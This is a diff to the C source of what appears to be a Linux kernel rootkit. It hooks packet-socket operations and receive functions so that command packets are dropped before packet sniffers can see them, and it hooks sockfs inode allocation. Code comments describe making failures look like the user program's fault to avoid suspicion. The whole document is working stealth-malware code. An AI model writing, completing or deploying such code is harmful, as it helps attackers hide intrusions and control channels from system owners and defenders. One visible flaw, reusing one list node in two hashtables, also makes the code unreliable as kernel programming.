@@ -4,78 +4,120 @@
 #include <linux/workqueue.h>
 #include <linux/fs.h>
 #include <linux/list.h>
+#include <linux/hashtable.h>
 
 #include "headers/networking.h"
 #include "headers/packet_headers/internal.h"
 
-static struct inode *(*original_alloc_inode)(struct super_block *sb);
+struct hooked_socket_entry {
+    struct hlist_node node;
+    struct socket *sock;
+    const struct proto_ops *original_packet_ops;
+    int (*original_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
+		                       struct packet_type *pt, struct net_device *orig_dev);
+};
 
-static const struct proto_ops *original_packet_ops = NULL;
-
-// static __poll_t new_packet_poll(struct file *file, struct socket *sock,
-// 				poll_table *wait)
-// {
-//     __poll_t result = original_packet_ops->poll(file, sock, wait);
-//     printk(KERN_INFO "packet socket polled!\n");
-//     return result;
-// }
-
-// static int new_packet_recvmsg(struct socket *sock, struct msghdr *msg, size_t len,
-// 			  int flags) 
-// {
-//     int result = original_packet_ops->recvmsg(sock, msg, len, flags);
-//     printk(KERN_INFO "packet socket recvmsg!\n");
-//     return result;
-// }
 void hook_packet_sock(struct socket *sock);
+struct hooked_socket_entry *get_socket_hook(struct socket *sock);
+struct hooked_socket_entry *get_socket_hook_by_prot_hook(struct packet_type *pt);
 
-static int new_packet_setsockopt(struct socket *sock, int level, int optname,
-		    char __user *optval, unsigned int optlen)
+static DEFINE_SPINLOCK(hook_packet_lock);
+
+static int hooked_packet_setsockopt(struct socket *sock, int level, int optname,
+		                            char __user *optval, unsigned int optlen)
 {
-    int result = original_packet_ops->setsockopt(sock, level, optname, optval, optlen);
+    int result;
+    unsigned long _flags;
+    struct hooked_socket_entry *sock_hook = get_socket_hook(sock);
+
+    // This case shouldn't happen, but if it does, the userspace program is likely to break.
+    // Returning 0 means the syscall will not be very suspicious without heavy debugging, 
+    // the immidiete suspect will be the userspace program, instead of the kernel.
+    // TODO: Add a panic method that will remove the rootkit if this happends.
+    if (!sock_hook) return 0;
+
+    result = sock_hook->original_packet_ops->setsockopt(sock, level, optname, optval, optlen);
+    spin_lock_irqsave(&hook_packet_lock, _flags);
     hook_packet_sock(sock);
+	spin_unlock_irqrestore(&hook_packet_lock, _flags);
     return result;
 }
 
-static int (*original_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
-		      struct packet_type *pt, struct net_device *orig_dev) = NULL;
-
-
-static int packet_no_rcv(struct sk_buff *skb, struct net_device *dev,
+static int hooked_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 		      struct packet_type *pt, struct net_device *orig_dev)
 {
+    struct hooked_socket_entry *sock_hook = get_socket_hook_by_prot_hook(pt);
+
     if (is_skb_cmd(skb)) {
         kfree_skb(skb);
         return 0;
     }
-    return original_packet_rcv(skb, dev, pt, orig_dev);
+
+    // This case shouldn't happen, but if it does, the userspace program is likely to break.
+    // Returning 0 means the syscall will not be very suspicious without heavy debugging, 
+    // the immidiete suspect will be the userspace program, instead of the kernel.
+    // TODO: Add a panic method that will remove the rootkit if this happends.
+    if (!sock_hook) return 0;
+
+    return sock_hook->original_packet_rcv(skb, dev, pt, orig_dev);
+}
+
+static DEFINE_HASHTABLE(hooked_sockets, 8);
+static DEFINE_HASHTABLE(hooked_sockets_by_prot_hook, 8);
+
+struct hooked_socket_entry *get_socket_hook(struct socket *sock) {
+    struct hooked_socket_entry *sock_hook;
+
+    hash_for_each_possible(hooked_sockets, sock_hook, node, (uintptr_t)sock) {
+        if (sock_hook->sock == sock) return sock_hook;
+    }
+    return 0;
+}
+
+struct hooked_socket_entry *get_socket_hook_by_prot_hook(struct packet_type *pt) {
+    struct hooked_socket_entry *sock_hook;
+
+    hash_for_each_possible(hooked_sockets_by_prot_hook, sock_hook, node, (uintptr_t)pt) {
+        if (&pkt_sk(sock_hook->sock->sk)->prot_hook == pt) return sock_hook;
+    }
+    return 0;
+}
+
+struct hooked_socket_entry *get_or_create_socket_hook(struct socket *sock, struct proto_ops **hooked_ops) {
+    struct packet_sock *po = pkt_sk(sock->sk);
+    struct hooked_socket_entry *sock_hook;
+
+    if ((sock_hook = get_socket_hook(sock))) {
+        *hooked_ops = (struct proto_ops *)sock->ops;
+        return sock_hook;
+    }
+
+    sock_hook = kmalloc(sizeof(struct hooked_socket_entry), GFP_KERNEL);
+
+    sock_hook->sock = sock;
+    sock_hook->original_packet_ops = sock->ops;
+    sock_hook->original_packet_rcv = po->prot_hook.func;
+    
+    *hooked_ops = kmalloc(sizeof(struct proto_ops), GFP_KERNEL);
+    memcpy(*hooked_ops, sock_hook->original_packet_ops, sizeof(struct proto_ops));
+    sock->ops = *hooked_ops;
+
+    hash_add(hooked_sockets, &sock_hook->node, (uintptr_t)sock);
+    hash_add(hooked_sockets_by_prot_hook, &sock_hook->node, (uintptr_t)(&pkt_sk(sock->sk)->prot_hook));
+    return sock_hook;
+}
+
+void hook_packet_sock(struct socket *sock) {
+    struct proto_ops *hooked_ops;
+    get_or_create_socket_hook(sock, &hooked_ops);
+
+    hooked_ops->setsockopt = hooked_packet_setsockopt;
+    pkt_sk(sock->sk)->prot_hook.func = hooked_packet_rcv;
 }
 
 int is_packet_sock(struct socket *sock) {
     if (!sock->sk) return 0;
     return sock->sk->sk_family == PF_PACKET;
-}
-
-static DEFINE_SPINLOCK(hook_packet_lock);
-
-void hook_packet_sock(struct socket *sock) {
-    struct proto_ops *new_ops;
-    struct packet_sock *po = pkt_sk(sock->sk);
-    if (original_packet_ops == NULL || sock->ops == original_packet_ops) {
-        printk(KERN_INFO "patching socket ops!\n");
-        original_packet_ops = sock->ops;
-        new_ops = kmalloc(sizeof(struct proto_ops), GFP_KERNEL);
-        memcpy(new_ops, original_packet_ops, sizeof(struct proto_ops));
-    //     new_ops->poll = new_packet_poll;
-    //     new_ops->recvmsg = new_packet_recvmsg;
-        new_ops->setsockopt = new_packet_setsockopt;
-        sock->ops = new_ops;
-    }
-    if (original_packet_rcv == NULL || po->prot_hook.func != packet_no_rcv) {
-        printk(KERN_INFO "patching socker packet rcv!\n");
-        original_packet_rcv = po->prot_hook.func;
-        po->prot_hook.func = packet_no_rcv;
-    }
 }
 
 int my_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void *key) {
@@ -103,6 +145,8 @@ struct unhooked_socket_entry {
 };
 
 static LIST_HEAD(unhooked_sockets);
+
+static struct inode *(*original_alloc_inode)(struct super_block *sb);
 
 static struct inode *new_alloc_inode(struct super_block *sb) {
     struct inode *res;
@@ -157,6 +201,9 @@ int MRK_init_sockets_hook(void) {
     struct super_block *super;
     struct super_operations *s_op;
     struct dentry_operations *s_d_op;
+
+    hash_init(hooked_sockets);
+    hash_init(hooked_sockets_by_prot_hook);
 
     fs_type = get_fs_type("sockfs");
 
